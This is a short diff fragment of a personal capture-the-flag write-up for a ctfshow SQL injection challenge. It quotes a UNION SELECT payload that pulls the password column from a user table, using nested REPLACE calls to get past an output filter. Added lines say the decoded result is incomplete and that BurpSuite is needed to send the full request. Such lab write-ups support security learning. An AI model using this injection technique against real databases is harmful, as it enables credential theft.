@@ -206,3 +206,7 @@ When we use the completed code to execute searching, we can't get the result:
 999' union select 'AAAA', replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#'), '4', '$'), '5', '%'), '6', '^'), '7', '&'), '8', '*'), '9', '(') from ctfshow_user4 where username = 'flag
 ```
 ![[Pasted image 20241221105315.png]]
+We can decode the URL code:
+![[Pasted image 20241221105418.png]]
+It's not completed!!!!
+So we need BurpSuite to send the completed command.
